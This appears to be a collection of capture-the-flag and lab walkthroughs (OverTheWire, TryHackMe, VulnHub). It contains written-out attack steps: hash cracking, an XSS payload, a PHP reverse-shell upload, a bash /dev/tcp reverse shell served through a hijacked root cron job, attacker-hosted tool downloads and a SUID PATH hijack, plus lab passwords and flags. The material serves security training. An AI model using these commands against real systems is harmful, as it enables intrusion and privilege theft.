Username: natas5
URL:      http://natas5.natas.labs.overthewire.org

docs.title: Walkthrough
docs.text:
Viewing the webpage reveals to us that access disallowed and we are not logged in.

Whenever I see anything concerning authentication, the first thing that coms to my mind is cookies. I thus decide to inspect the webpage for cookies

We find a cookie named loggedin and its value is 0. I changed it to 1

Changing it to 1, we are now logged in and we have the password

password : 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

docs.title: TryHackMe Writeups
docs.text:
TryHackMe provides hands‑on cybersecurity labs that reinforce practical exploitation skills.

This section contains my curated collection of room writeups — structured, concise, and focused on methodology.

docs.title: Difficulty Categories
docs.text:
Choose a tier and dive in:

  • Easy Rooms
  • Medium Rooms (Coming Soon)
  • Hard Rooms (Coming Soon)

This collection grows continuously as I grind more rooms, sharpen skills, and prepare for professional certifications.

docs.title: Easy Machines
docs.text: This section features beginner-friendly TryHackMe machines designed for foundational skills in reconnaissance, enumeration, and basic exploitation. Each room emphasizes practical learning with guided environments ideal for newcomers to cybersecurity.

docs.title: Completed Machines
docs.text:
• Anonforce
  • mKingdom

More easy machines will be added as progress continues through TryHackMe's beginner track.

docs.title: Synopsis
docs.text: The Anonforce TryHackMe room features a critically misconfigured vsftpd FTP server with anonymous access enabled and anon_root=/, exposing the entire Linux root filesystem. This vulnerability allowed me to unauthenticated enumerate sensitive files, crack a GPG key, extract /etc/shadow, compromise the root password, and gain full system access via SSH.

docs.title: Reconnaissance
docs.text:
I began by running an Nmap scan to identify open ports and services:

nmap -sC -sV 10.49.161.36

This revealed two open ports: 21/FTP and 22/SSH.

docs.title: Enumeration
docs.text:
I targeted the FTP service on port 21 with anonymous credentials. The login succeeded without a password, dropping me directly into the root directory / (no chroot jail). This severe misconfiguration violated vsftpd security defaults

I navigated to /home and identified user melodias

Within the user meliodas was the user flag

I downloaded and verified the user flag contents.

I probed /etc/shadow (inaccessible directly) and SSH keys (none found). A non-standard, world-writable directory notread caught my attention.

docs.title: Exploitation
docs.text:
There are two files : backup.pgp and private.asc Doing a little research I found what the two files might be. private.asc is a text file containing a private encryption key used to securely unlock and access encrypted data. backup.pgp is an encrypted backup file that stores protected data or documents, which can only be accessed and decrypted with the correct private key or passphrase

To download those files to your local device, use

mget *

In this engagement, it appears that we need to use the private key private.asc to decrypt backup.pgp. To achieve this, we need to import the key then decrypt the file

So, I imported the file using

gpg --import private.asc

However, it prompted me for a passphrase that I do not know

It was there that I resorted to bruteforce the passphrase on private.asc using john the ripper, since gpg keys use extractable hashes

I first converted the key into a format john the ripper can understand 

gpg2john private.asc > gpg.hash

I then cracked the hash using john the ripper

john -w=/usr/share/wordlists/rockyou.txt gpg.hash

I found the passphrase as xbox360

So, I now imported the file once more and inserted the passphrase

gpg --import private.asc

The key was successfully imported. The final step now was to decrypt the encrypted file using the imported key

gpg --output decrypted.file --decrypt backup.pgp

It accepted and I viewed the contents of the decrypted.file. It seemed to be the contents of the /etc/shadow file

In it, was the root hash which I copied at and attempted to crack it with john the ripper once more

$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0

I copied the root hash into a file and cracked it

john -w=/usr/share/wordlists/rockyou.txt root.hash

I got the root hash which is hikari

docs.title: Privilege Escalation
docs.text:
I established SSH connection as root:

ssh root@10.49.132.128
# Password: hikari

Retrieved root.txt flag from /root directory.

docs.title: Remediation & Hardening Recommendations
docs.text:
Root Cause: vsftpd configuration with anon_root=/ exposing entire filesystem to anonymous users.

Immediate Hardening Steps:

  1. Edit /etc/vsftpd.conf:
anonymous_enable=NO          # Disable anonymous access completely
# OR for limited anonymous access:
# anon_root=/var/ftp         # Isolate to secure directory
anon_upload_enable=NO        # Prevent anonymous uploads
chroot_local_user=YES        # Chroot local users to home directories
write_enable=NO              # Disable file writes unless required
  1. Create secure anonymous directory (if retaining anonymous access):
mkdir -p /var/ftp/pub
chown root:root /var/ftp
chmod 755 /var/ftp
  1. Restart vsftpd service:
systemctl restart vsftpd
  1. Verification: Anonymous FTP login now denied.

docs.title: Reconnaissance
docs.text:
I began by running an Nmap scan to identify open ports and services on the target machine:

nmap -sC -sV 10.10.154.223

This revealed an open port and service to investigate further.

docs.title: Enumeration
docs.text:
I Visited the web service on the target and surfed it

I used gobuster to perform directory enumeration, which revealed an /app directory.

Navigating the site, I found a jump link redirecting to the /castle directory.

Using Wappalyzer, I identified the CMS used on the site as Concrete CMS 8.5.2.

At the bottom of the /castle directory, there was a login link.

Knowing the CMS as concrete5, I researched default credentials and found admin:password worked.

docs.title: Exploitation: Concrete CMS Remote Code Execution
docs.text:
Researching the CMS version uncovered a known vulnerability (HackerOne reference) allowing file upload exploitation by:

  1. Adding php to the allowed file types under "Allow File Types".

  1. Uploading a PHP reverse shell (PentestMonkey’s reverse shell).

  1. Configuring the shell with the attacker’s IP (LHOST) and listening port.

  2. Launching a Netcat listener to catch the reverse shell.

  3. Triggering the uploaded file to obtain a shell.

docs.title: Initial Shell and Privilege Enumeration
docs.text:
After capturing the shell, I stabilized it using:

python -c 'import pty; pty.spawn("/bin/bash")' 

CTRL+Z stty raw -echo fg export SHELL=/bin/bash export TERM=screen stty rows 38 columns 116 reset

I then uploaded linpeas.sh for privilege escalation enumeration:

# Attacker machine 
python3 -m http.server 8000

# Target machine
wget http://<attacker-ip>:8000/linpeas.sh

LinPEAS revealed credentials in a configuration file:

<?php

return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => 'toadisthebest',
            'character_set' => 'utf8',
            'collation' => 'utf8_unicode_ci',
        ],
    ],
];

Noticing MySQL on port 3306 and port 631 open locally, I port-forwarded MySQL using Chisel:

# Attacker machine 
chisel server --reverse --port 5555 


# Target machine 
./chisel client <attacker-ip>:5555 R:127.0.0.1:3306

This allowed me to connect to the database remotely and explore.

docs.title: Lateral Movement and Further Enumeration
docs.text:
Logging into MySQL with the discovered credentials yielded no useful data, so I switched users to toad using the password found earlier:

su toad 
# Password: toadisthebest`

Rerunning LinPEAS as user toad uncovered a suspicious Base64 string in an environment variable: PWD_token=aWthVGVOVEFOdEVTCg==

echo "aWthVGVOVEFOdEVTCg==" | base64 -d 
# Output: ikaTeNTANtES`

This turned out to be the password for user mario, allowing me to switch to mario. Though the flag was protected by permissions, copying it to /tmp allowed me to read it.

docs.title: Persistence and Root Access
docs.text:
To identify ongoing system activity, I uploaded and ran pspy64 to monitor running processes in real-time:

# Attacker machine
 python3 -m http.server 8000

 # Target machine 
wget http://<attacker-ip>:8000/pspy64 
chmod +x pspy64 
./pspy64

This revealed a root cron job running every minute that fetched and executed a remote shell script via:

curl mkingdom.thm:85/app/castle/application/counter.sh

Seeing that /etc/hosts was writable, I redirected mkingdom.thm to my IP by modifying /etc/hosts. I experienced issues when trying to modify the file using text editors like nano, I thus ran the command below

tee /etc/hosts > /dev/null <<EOF 
127.0.0.1       localhost
10.9.3.255       mkingdom.thm
127.0.0.1       backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
EOF

I hosted a malicious version of counter.sh, containing a reverse shell payload, on a Python HTTP server that replicated the expected path. i.e app/castle/application/counter.sh.

I started the server at the folder containing app, which was mKingdom, i.e mKingdom/app/castle/application/counter.sh

The payload was:

#!/bin/bash 
bash -c 'exec bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1'

When the cron job executed, it retrieved and ran my payload as root, granting me a root shell and full control of the machine.

I then copied the flag to the /tmp directory from where I was able to read the flag

docs.title: VulnHub Writeups
docs.text:
VulnHub hosts real OS-level boot-to-root machines, ideal for sharpening practical penetration testing skills. Each machine or series presents unique challenges in enumeration, exploitation, and post-exploitation.

In this section, I document every VulnHub machine I exploit:

  • Full enumeration workflow
  • Privilege escalation methodology
  • Screenshots, commands, and outputs
  • Lessons learned & exploitation mindset

These writeups reflect real-world penetration testing logic rather than simple step-by-step guides.

docs.title: Single Machines
docs.text: Standalone machines designed to teach specific skills or vulnerabilities. - List of single machines coming soon

docs.title: Series Machines
docs.text:
Series of connected machines forming progressive boot-to-root challenges. - List of series machines coming soon

This collection will grow as I continue exploring new machines and series.

docs.title: VulnHub — Series Machines
docs.text: This section contains multi‑part or themed VulnHub machine series. These offer progressive difficulty, deeper enumeration, and chained exploitation paths.

docs.title: Completed Series
docs.text:
• Momentum

Additional series entries will be added as I continue working through more VulnHub machine sets.

docs.title: Initial Reconnaissance
docs.text:
I began by scanning the network to find the target machine’s IP address:

ip neigh 

# Alternatively, we can use: 
sudo arp-scan -l

The discovered IP address was 192.168.56.103.

I ran an nmap scan which revealed two open ports: 22 (SSH) and 80 (HTTP).

docs.title: Enumeration
docs.text:
My first step was to visit the web page hosted on port 80.

I then examined the source code and ran gobuster to enumerate hidden directories.

The following endpoints were discovered:

  • /index.html: 200 OK
  • /js/: Contained main.js
  • /css/, /img/, /manual/: Static content
  • /.htaccess, .htpasswd, /server-status: Forbidden

Navigating into /js/, I found a file named main.js with the following content:

function viewDetails(str) {
   window.location.href = "opus-details.php?id="+str; 
}

/* var CryptoJS = require("crypto-js"); 
var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum"); console.log(decrypted.toString(CryptoJS.enc.Utf8)); 
*/

This revealed:

  • A client-side redirection function.
  • A commented-out decryption snippet with a hardcoded AES passphrase: SecretPassphraseMomentum.

The redirection function was interesting because visiting image links redirected the URL with an id parameter, for example:

http://192.168.56.103/opus-details.php?id=demon

Similarly, the id changed on visiting another image, like angel:

http://192.168.56.103/opus-details.php?id=angel

Experimenting with the id parameter, I tested an XSS payload:

http://192.168.56.103/opus-details.php?id=<script>alert(1)</script>

The payload was reflected, confirming the vulnerability.

I further used the payload to retrieve the cookie value:

http://192.168.56.103/opus-details.php?id=<script>alert(document.cookie)</script>

The cookie value appeared encrypted:

cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt

Knowing the AES key from the commented script, I created a Node.js decryption script:

var CryptoJS = require("crypto-js"); 
var encrypted =
"U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt"; 
var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum"); console.log(decrypted.toString(CryptoJS.enc.Utf8));`

The output was:

auxerre-alienum##

This appeared to be credentials or a password.

docs.title: Exploitation
docs.text:
After trial and error, I successfully logged in via SSH:

ssh auxerre@192.168.56.103   
# password: auxerre-alienum##

I obtained the user flag:

84157165c30ad34d18945b647ec7f647

docs.title: Initial Shell & Post-Exploitation
docs.text:
To escalate privileges, I launched linpeas for an automated system scan.

# Local machine:   
python3 -m http.server 8000 

# Target machine:   
cd /tmp   wget http://<vboxnet>:8000/linpeas.sh   
# Make it executable
chmod +x linpeas.sh

linpeas revealed a local service: Redis running on localhost only.

127.0.0.1:6379 → redis-server listening on localhost only

This was confirmed by:

ps aux | grep redis   
ss -nltup | grep 6379

However, connecting locally to Redis produced a permission denied message.

docs.title: Privilege Escalation via Port Forwarding
docs.text:
To connect remotely, I used chisel for port forwarding.

# Local machine:   
python3 -m http.server 8000 

# Target machine:   
cd /tmp   wget http://<vboxnet>:8000/chisel   
# Make it executable
chmod +x chisel

On the attacker machine, I ran:

chisel server --reverse --port 5555

On the target machine, I ran:

./chisel client <attacker-ip>:5555 R:127.0.0.1:6379

This allowed remote connection to the Redis server for further exploitation.

docs.title: Root Access
docs.text:
With the root password obtained, I switched to root user:

su root   
# Password: m0mentum-al1enum##

Finally, I retrieved the root flag:

658ff660fdac0b079ea78238e5996e40

docs.title: VulnHub — Single Machines
docs.text: This section contains standalone VulnHub boot‑to‑root machines. Each machine focuses on a specific concept or exploit path, making them ideal for targeted practice.

docs.title: Completed Machines
docs.text:
ICA

More single machines will be added as I progress through additional VulnHub challenges.

docs.title: Initial Reconnaissance
docs.text:
To begin, I scanned the network to identify the target machine's IP address:

ip neigh

# Alternatively, we can use: 
sudo arp-scan -l

The discovered IP address was 192.168.57.6.

Next, I conducted an nmap scan to enumerate open ports. The scan revealed three open ports: 22 (SSH), 80 (HTTP), and 3306 (MySQL).

docs.title: Enumeration
docs.text:
Accessing the web server on port 80, I encountered a login screen. At the bottom of the login section, the CMS version was displayed as qdPM 9.2.

Using searchsploit, I checked for known exploits for qdPM 9.2 and found an exploit related to password exposure.

To review the exploit details, I extracted it with:

searchsploit -x php/webapps/50176.txt

The exploit directed me to a URL where the database credentials were exposed at: http://<website>/core/config/databases.yml

Visiting this URL confirmed the presence of the database configuration file containing plaintext credentials.

The captured credentials were as follows:

db_username=qdpmadmin
db_name=qdpm   
host=localhost (192.168.57.6)   
port=3306   
password=UcVQCMQk2STVeS6J

Using the obtained credentials, I connected to the MySQL database:

mysql -h 192.168.57.6 -u qdpmadmin -p   
# Password: UcVQCMQk2STVeS6J`

Listing the databases showed two unique databases: qdpm and staff.

The qdpm database contained no relevant information, but the staff database included two tables of interest: user and login.

SHOW DATABASES;   
USE staff;   
SHOW TABLES;   
SELECT * FROM user;   
SELECT * FROM login;

Examining the tables, the user table held usernames, while the login table contained base64-encoded passwords. Importantly, the passwords were not logically aligned with their users but linked via their IDs.

To correlate passwords with users, I matched the id from the user table to the user_id in the login table.

After sorting, the credentials appeared as:

smith = WDdNUWtQM1cyOWZld0hkQw==   
lucas = c3VSSkFkR3dMcDhkeTNyRg==   
travis = REpjZVlyOThXMjhZN3dMZw==   
dexter = N1p3VjRxdGc0MmNtVVhHWA==   
meyer = Y3FObkJXQ0J5UzJEdUpTeQ==

To decode the passwords, I used the base64 command:

echo "<encoded_passwd>" | base64 -d

Resulting in cleartext passwords:

smith = X7MQkP3W29fewHdC   
lucas = suRJAdGwLp8dy3rF   
travis = DJceVy98W28Y7wLg   
dexter = 7ZwV4qtg42cmUXGX   
meyer = cqNnBWCByS2DuJSy

docs.title: Exploitation
docs.text:
Given port 22 was open, I manually attempted SSH logins with the usernames and their decoded passwords. Only Travis and Dexter could successfully authenticate.

Alternatively, I automated this process using Hydra. I saved usernames in users.txt and passwords in passwd_cracked.txt, then ran:

hydra -L users.txt -P passwd_cracked.txt ssh://192.168.57.6

Hydra confirmed the credentials for Travis.

I logged in as Travis:

ssh travis@192.168.57.6 
# Password: DJceVy98W28Y7wLg

Inside Travis' account, I found the user.txt file containing the flag:

ICA{Secret_Project}

Running linpeas yielded no further privilege escalation insights from this user.

To upload linpeas:

# From local machine, run a Python HTTP server:   
python3 -m http.server 8000 

# On target machine, navigate to /tmp and download linpeas:   
wget http://<vboxnet>:8000/linpeas.sh   
# Make linpeas executable:   
chmod +x linpeas.sh

docs.title: Initial Shell
docs.text:
Next, I logged into Dexter's account:

ssh dexter@192.168.57.6   
# Password: 7ZwV4qtg42cmUXGX

Inside Dexter's home directory, I found a note referencing a potentially vulnerable executable. This became my next focus.

Running linpeas again, I located the binary in question.

Attempting to run it directly resulted in a permission error.

docs.title: Privilege Escalation
docs.text:
Using strings analysis on the binary:

strings get_access

The output revealed the binary executed the cat command to read files accessible only by root.

Because the binary called cat by relative path (/usr/bin/cat), I attempted a Relative Path Hijacking attack on this SUID program.

The steps were:

Navigate to /tmp:

cd /tmp

Create a file named cat:

touch cat

Add a command to spawn a root shell:

echo "/bin/bash" > cat

Update the PATH environment variable to include /tmp first:

echo $PATH   export PATH=/tmp:$PATH

Confirm /tmp is first in PATH:

echo $PATH

Make the custom cat executable and run the vulnerable binary:

chmod +x cat   /opt/get_access

The shell spawned had root privileges. Since the original cat was replaced, I used more to view the root-only file.

The root-only file contained the flag:

ICA{Next_Generation_Self_Renewable_Genetics}

To restore the PATH variable and fix the cat command functionality:

export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:$PATH

This corrected the issue.
